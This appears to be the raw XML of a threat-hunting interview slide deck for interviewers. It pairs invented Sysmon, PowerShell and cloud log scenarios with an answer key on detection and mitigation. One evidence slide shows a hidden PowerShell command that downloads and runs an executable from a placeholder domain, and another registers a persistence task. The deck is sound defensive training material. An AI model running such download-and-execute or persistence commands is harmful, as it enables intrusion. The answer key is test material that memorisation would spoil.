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b75d627a64bf7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="/docProps/app.xml" Id="Rd23722fdb84b4a00" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="/ppt/presentation.xml" Id="R2b8a0fb2365c45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133dd2ca38471c"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="Rfcea19abb4454e2b"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="256" r:id="R9a37f496425a425b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="257" r:id="R24ccb550717e4b38"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="258" r:id="Rb308edd5f44746c3"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="259" r:id="R54438ac55f8a4cfc"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="260" r:id="Rdc332326ca684be3"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="261" r:id="Raf40345c56d54cae"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="262" r:id="R6e905b00275a41d6"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="263" r:id="R87786f81b7484df6"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="264" r:id="Ref1c51ce612e451f"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="265" r:id="Rf10ecfdf1d8848dc"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="266" r:id="Racbf999c7daf458b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="267" r:id="R1ad42e6b590545d9"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="268" r:id="Rbce66d5812294b8e"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="269" r:id="Rb78b867f5e5b4a17"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="270" r:id="R26cef465fb8b4cf7"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="271" r:id="Race528ab15124a2b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="272" r:id="R0f714acbcf1444ab"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="273" r:id="Rbafef7bc0de94cff"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="274" r:id="R9deb90eaecbe48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ab90a3221e4517" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="/ppt/slideMasters/slideMaster1.xml" Id="R6f133dd2ca38471c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rfcea19abb4454e2b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="/ppt/presProps.xml" Id="Rec897086a0e94d90" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="/ppt/tableStyles.xml" Id="Re0d8a8c4f0b04a5f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide1.xml" Id="R9a37f496425a425b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide2.xml" Id="R24ccb550717e4b38" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide3.xml" Id="Rb308edd5f44746c3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide4.xml" Id="R54438ac55f8a4cfc" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide5.xml" Id="Rdc332326ca684be3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide6.xml" Id="Raf40345c56d54cae" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide7.xml" Id="R6e905b00275a41d6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide8.xml" Id="R87786f81b7484df6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide9.xml" Id="Ref1c51ce612e451f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide10.xml" Id="Rf10ecfdf1d8848dc" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide11.xml" Id="Racbf999c7daf458b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide12.xml" Id="R1ad42e6b590545d9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide13.xml" Id="Rbce66d5812294b8e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide14.xml" Id="Rb78b867f5e5b4a17" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide15.xml" Id="R26cef465fb8b4cf7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide16.xml" Id="Race528ab15124a2b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide17.xml" Id="R0f714acbcf1444ab" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide18.xml" Id="Rbafef7bc0de94cff" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide19.xml" Id="R9deb90eaecbe48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75ddba4e9249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093ee17b604afa" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R7df1e6f1c1a94d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6e122a32954450" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc23af1aa412441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b9a7c9d9d544aa" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R6273dac61a3244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a15bfdb3ab4b56" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R2e382c2b1fb54c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1de438f9a745cf" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R0091e1bb684744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7f7afb43ae4bf0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R2f0e3c441e1946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d21908323b47f7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Re4d3d3f0785c48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6dbd4d1a3f4b0c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Re14c5e28c9e248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2d2149cf484778" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc7c05423147247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cb182c08ae48c5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf75ebf3682324b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eac61856894fb9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Re76a89fa620f40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3344ac1f9c413d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Reaffe9c784f14a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25d91010e94b86" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R8b00c1b0406440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d3ca7b7436498c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rb2dd1858a3334c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d51c1832624fd0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R78d787dffc6145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891edbfbe74146" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rb808c7c644ee41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08d4c878a14516" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R7ec3190fee7640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81bfa4ce38a4856" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R9aa23a7470da445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638f5bc12d4297" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf319301f8a064f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scenarios. Names, domains, IP addresses, logs, and architectures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selected scenarios one at a time. Give the candidate time to reason aloud.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selected raw fields. Field semantics reference:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/defender-endpoint/attack-surface-reduction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selected raw fields. Field semantics reference:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4624</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes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selected raw fields. Field semantics reference:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/windows/win32/debug/pe-format</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://attack.mitre.org/techniques/T1555/003/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys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selected raw fields. Field semantics reference:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/awscloudtrail/latest/APIReference/API_StopLogging.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html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code excerpts and domains. The URL assignments are contextual values, not lines from the script. No execution evidence is supplied.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.python.org/3/library/pathlib.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.python.org/3/library/subprocess.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.python-requests.org/en/latest/user/quickstart/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architecture. AWS security group rules can reference a specific source security group; VPC Flow Logs provide network-flow visibility.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/en_en/vpc/latest/userguide/security-group-rules.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/vpc/latest/userguide/flow-logs.html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architecture. CISA recommends separate privileged identities, PAM, MFA, and auditing for admin access.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.cisa.gov/sites/default/files/2023-12/ESF%20IDENTITY%20AND%20ACCESS%20MANAGEMENT%20RECOMMENDED%20BEST%20PRACTICES%20FOR%20ADMINISTRATORS%20PP-23-0248_508C.pdf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Hint 1 only after an initial attempt. Offer Hint 2 if still needed. Record which hints were used; score the final reasoning and note the support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key:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Assessment: Likely document-triggered PowerShell loader. WINWORD launches hidden PowerShell, whose script downloads and executes s.exe. The excerpt does not show the payload's behavior or prove a macro was used.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Detection: Join WINWORD-to-PowerShell process creation with 4104 download-and-execute content, network activity, and the downloaded file hash. Hunt across endpoints; tune for approved Office automation.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Mitigation: Isolate LT-184, preserve the document and payload, stop the process, and scope other hosts that ran the hash or contacted the domain.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Prevention: Use the Office child-process ASR rule where compatible, application control for user-writable paths, and script block logging with alerting.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https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/defender-endpoint/attack-surface-reduction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Hint 1 only after an initial attempt. Offer Hint 2 if still needed. Record which hints were used; score the final reasoning and note the support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key:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Assessment: A PowerShell remoting session from WS-107 creates logon persistence on FS-02. This could be approved administration; the task binary, source workstation, and change record determine intent.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Detection: Correlate source PowerShell/4104 and WinRM traffic with target 4624, target 4104, and TaskScheduler/106. Baseline approved admin sources and task names rather than flagging all remoting.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Mitigation: If unauthorized, disable the task after preserving evidence, isolate WS-107, inspect FS-02, and rotate svc_patch credentials.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Prevention: Limit remoting to managed admin hosts, reduce svc_patch privileges, and use constrained endpoints such as JEA for routine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https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4624</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes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Hint 1 only after an initial attempt. Offer Hint 2 if still needed. Record which hints were used; score the final reasoning and note the support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key:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Assessment: Likely browser credential theft with persistence and outbound transfer. Static imports and strings are clues; the sandbox read, Run-key write, and POST provide behavioral support. Confirm what data was sent.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Detection: Hunt for the hash and for non-browser processes reading Login Data, setting Run keys, and sending outbound POSTs. Analyze the sample in an isolated instrumented environment.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Mitigation: Isolate hosts that ran the sample, quarantine copies, remove persistence after evidence capture, and treat stored browser credentials as exposed.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Prevention: Restrict executables from download paths, verify software provenance, reduce browser-stored secrets, and require phishing-resistant MFA for high-value accounts.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https://learn.microsoft.com/en-us/windows/win32/debug/pe-format</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://attack.mitre.org/techniques/T1555/003/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys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Hint 1 only after an initial attempt. Offer Hint 2 if still needed. Record which hints were used; score the final reasoning and note the support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key:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Assessment: The CI role creates an access key for breakglass-admin and then stops org-audit logging. This is high-risk activity; confirm the trail state and whether the change was authorized.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Detection: Alert on key creation for privileged users and StopLogging, especially in one role session. Correlate actor, source IP, account, region, and change records.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Mitigation: Restore logging, disable the new key, revoke the role session if unauthorized, and trace key use across regions and accounts.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Prevention: Remove key-management and logging-control rights from CI roles. Apply preventive policy to protect audit trails and monitor them from an independent account.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https://docs.aws.amazon.com/awscloudtrail/latest/APIReference/API_StopLogging.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html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Hint 1 only after an initial attempt. Offer Hint 2 if still needed. Record which hints were used; score the final reasoning and note the support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https://docs.python.org/3/library/pathlib.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.python.org/3/library/subprocess.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.python-requests.org/en/latest/user/quickstart/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Hint 1 only after an initial attempt. Offer Hint 2 if still needed. Record which hints were used; score the final reasoning and note the support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https://docs.aws.amazon.com/en_en/vpc/latest/userguide/security-group-rules.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/vpc/latest/userguide/flow-logs.html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Hint 1 only after an initial attempt. Offer Hint 2 if still needed. Record which hints were used; score the final reasoning and note the support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https://www.cisa.gov/sites/default/files/2023-12/ESF%20IDENTITY%20AND%20ACCESS%20MANAGEMENT%20RECOMMENDED%20BEST%20PRACTICES%20FOR%20ADMINISTRATORS%20PP-23-0248_508C.pdf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0528875f044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a79ab9d6ff4f86" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="/ppt/slideLayouts/slideLayout1.xml" Id="R92df812a3b1e4f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df812a3b1e4f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d4bb23be74540" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide1.xml" Id="R350114f09f324c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f063595e8412d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide2.xml" Id="Rf9d12c06c7dd4b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5914fdf4942c0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide3.xml" Id="R251fad889b2c4a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22a6f18d14dfd" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide4.xml" Id="R45bcae20c8d34b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89ac1262e42a5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide5.xml" Id="R89fb4025fec54e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0c3ffe9964c7b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide6.xml" Id="R7571f0eb14484d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a890373454e38" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide7.xml" Id="R5d09e0c241904c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39079984147ba" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide8.xml" Id="R60cdfa783d5c42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a3a89698d44ae" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide9.xml" Id="R2a8f78cad33246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e3f8ca6014729" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide10.xml" Id="R20be863c665e4d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67365f5244260" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide11.xml" Id="R59669f4a127242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83beee00a4845" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide12.xml" Id="Rce3fda54f7234f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4f54599f24b6e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide13.xml" Id="R754b3ea8ad014e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5c5bfd41c4b1a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide14.xml" Id="R112ed6ce0f3c46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2b4100ef04443" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide15.xml" Id="Rab96e685651d47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0a907b81f4091" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide16.xml" Id="R869ed0ec858a43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f15b690e84cb7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide17.xml" Id="Rb88ef297ef7344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ff235396a4a65" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide18.xml" Id="R29ed602f18ea4c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2cb31114049e8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide19.xml" Id="R08eea6937f3b46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DF9AD-A3B7-4367-9DBF-018551FF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7F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7F2"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Senior threat hunter interview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C95A6-9307-46C4-9D1B-94A639BF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FD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D7D8"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Four log cases, one Python review, two architecture reviews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4ECCB-6DCD-4F71-B286-584344F4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9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AB9C0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Interviewer edition</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="455062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FC345-ED47-4709-94F3-C30D1348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Candidate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DB781-3383-407E-AFDC-BECF867A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For each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2EE2C-C958-474B-86C3-D030B5CC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0668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Explain what the evidence shows and what remains uncertain.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Describe how you would detect or confirm related activity.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Prioritize immediate mitigation, then propose a preventive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3BF4B-D66F-49EA-8864-F061E3E8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The questions are on each evidence slide. Ask for telemetry or context you need.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1293311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E34BA-116B-43D9-8BD1-4982618A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01  /  LT-184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05436-2BA5-43F8-9816-BA256D23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POWERSHELL + SYSMON  ·  09:14 UTC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9C148-A8D9-453C-9D77-2403E6F9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58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2026-09-29T09:14:02Z LT-184 Sysmon/1 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe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ParentImage=...\Office16\WINWORD.EXE User=CORP\ada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CommandLine=powershell.exe -NoProfile -WindowStyle Hidden -File C:\Users\ada\AppData\Local\Temp\u.ps1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2026-09-29T09:14:03Z LT-184 PowerShell/4104 User=CORP\ada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ScriptBlockText=$p=Join-Path $env:TEMP 's.exe'; Invoke-WebRequest 'https://cdn-docs.example/s' -OutFile $p; &amp; $p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2026-09-29T09:14:04Z LT-184 Sysmon/3 Image=...\powershell.exe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DestinationHostname=cdn-docs.example DestinationPort=443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2026-09-29T09:14:05Z LT-184 Sysmon/11 Image=...\powershell.exe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TargetFilename=C:\Users\ada\AppData\Local\Temp\s.exe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2026-09-29T09:14:06Z LT-184 Sysmon/1 Image=...\Temp\s.exe ParentImage=...\powershell.exe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7D286-20A5-4452-BA9E-E74B5E55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3F691-1A24-4960-B8EA-39A084F4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What execution chain does this evidence support, and what remains unproven?</a:t>
            </a:r>
          </a:p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hunt for related activity, contain the host, and prevent recurrence?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="142907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AB389-BE32-4BCF-A869-30223B1D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02  /  WS-107 to FS-02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A0AE6-0552-4F0E-9C09-568DFA2B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POWERSHELL REMOTING + WINDOWS EVENTS  ·  02:11 UTC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B0D2B-33F2-42F2-BEAE-4F0254E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58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2026-09-29T02:11:00Z WS-107 PowerShell/4104 User=CORP\svc_patch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ScriptBlockText=Invoke-Command -ComputerName FS-02 -FilePath C:\Tools\health.ps1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2026-09-29T02:11:01Z WS-107 Sysmon/3 Image=...\powershell.exe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DestinationIp=10.24.5.12 DestinationPort=5985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2026-09-29T02:11:02Z FS-02 Security/4624 TargetUser=CORP\svc_patch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LogonType=3 IpAddress=10.24.18.77 TargetLogonId=0x7e4b1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2026-09-29T02:11:04Z FS-02 PowerShell/4104 User=CORP\svc_patch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ScriptBlockText=Register-ScheduledTask -TaskName TelemetryRefresh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Action=Execute:C:\ProgramData\cache\wmcache.exe Trigger=AtLogOn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2026-09-29T02:11:05Z FS-02 TaskScheduler/106 TaskName=TelemetryRefresh User=CORP\svc_patch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DFA3F-2D76-4A04-8DC2-E53D3051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664DB-6429-49FB-ABC8-BAEA99C4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Is this approved administration or persistence? Which evidence would decide?</a:t>
            </a:r>
          </a:p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What would you detect, mitigate immediately, and change in the access design?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
